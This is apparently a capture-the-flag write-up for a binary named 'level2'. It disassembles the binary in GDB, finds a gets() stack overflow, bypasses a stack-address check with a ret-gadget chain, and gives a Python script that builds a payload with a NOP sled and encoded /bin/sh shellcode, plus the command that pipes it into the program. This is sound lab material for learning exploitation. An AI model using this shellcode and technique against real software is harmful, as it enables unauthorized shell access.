Let's start with 'GDB':
``` shell
$ gdb level2 
(gdb) set disassembly-flavor intel
(gdb) set disassembly-flavor intel
(gdb) disas *main
Dump of assembler code for function main:
   0x0804853f <+0>:  push   ebp
   0x08048540 <+1>:  mov    ebp,esp
   0x08048542 <+3>:  and    esp,0xfffffff0
   0x08048545 <+6>:  call   0x80484d4 <p>
   0x0804854a <+11>: leave  
   0x0804854b <+12>: ret    
End of assembler dump.
```

Let's inspect `p` funtion:
```shell
(gdb) disas *p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp
   0x080484d5 <+1>:     mov    ebp,esp
   0x080484d7 <+3>:     sub    esp,0x68
   0x080484da <+6>:     mov    eax,ds:0x8049860
   0x080484df <+11>:    mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c]
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax
   0x080484ed <+25>:    call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000
   0x08048505 <+49>:    jne    0x8048527 <p+83>
   0x08048507 <+51>:    mov    eax,0x8048620
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax
   0x08048516 <+66>:    call   0x80483a0 <printf@plt>
   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:    lea    eax,[ebp-0x4c]
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax
   0x0804852d <+89>:    call   0x80483f0 <puts@plt>
   0x08048532 <+94>:    lea    eax,[ebp-0x4c]
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:   leave  
   0x0804853e <+106>:   ret    
End of assembler dump.
```

We see a `gets` call.
So we can perform a buffer overflow.

However, simple buffer overflow won't work.
That's because the code verifies that return address is not on the stack:
```
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4]
   ...
   0x080484fb <+39>:    and    eax,0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000
```

We can utilize a simple trick.
We want to overwrite return address with a stack address.
But what if put into return address the return address itself and then the stack address?
So the program will return to return itself, then to desired address.

This will work like this:
```
   0x1  pop   $eax  ; stack: 0x1 0xb1 / pop 0x1
   0x2  jump  $eax  ; stack: 0x1 / jump to 0x1
```
and then:
```
   0x1  pop   $eax  ; stack: 0xb1 / pop 0xb1
   0x2  jump  $eax  ; stack: / jump to 0xb1
```

To implement following thick we need to assemble a string for buffer overflow.
Let's do this with a Python script:
``` python
import struct

indent = 'a' * (0x4c + 4)
ret = struct.pack('I', 0x0804853e)
eip = struct.pack('I', 0xbffff75c)
nop = '\x90' * 100
test = '\xcc' * 4 + 'b' * 50
bin_sh = "\xeb\x11\x5e\x31\xc9\xb1\x32\x80"\  
         "\x6c\x0e\xff\x01\x80\xe9\x01\x75"\  
         "\xf6\xeb\x05\xe8\xea\xff\xff\xff"\  
         "\x32\xc1\x51\x69\x30\x30\x74\x69"\ 
         "\x69\x30\x63\x6a\x6f\x8a\xe4\x51"\  
         "\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"


print(indent + ret + eip + nop + bin_sh)
```

Then run then programm and supply the string for exploit:
``` shell
$ (python /tmp/exploit.py; cat) | ./level2
```